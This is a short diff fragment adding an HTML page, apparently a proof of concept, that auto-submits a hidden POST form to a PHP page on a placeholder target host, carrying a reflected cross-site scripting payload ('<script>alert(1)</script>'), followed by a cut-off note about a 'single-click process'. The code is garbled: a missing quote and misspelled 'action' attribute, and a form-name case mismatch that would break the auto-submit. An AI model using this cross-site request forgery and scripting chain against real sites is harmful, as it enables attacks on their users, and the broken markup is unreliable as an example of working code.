@@ -1,0 +1,13 @@
+<html>
+<body>
+<form name="fuckForm" method="POST ction="http://publicpages.targetwebsite.com/~someuser/Php.php">
+ <input type="hidden" name="input" value="<script>alert(1)
+ </script>">
+</form>
+<script>
+ document.fuckform.submit()
+</script>
+</body>
+</html>
+
+Single-click process. To do so, I am  creating here HTML page:
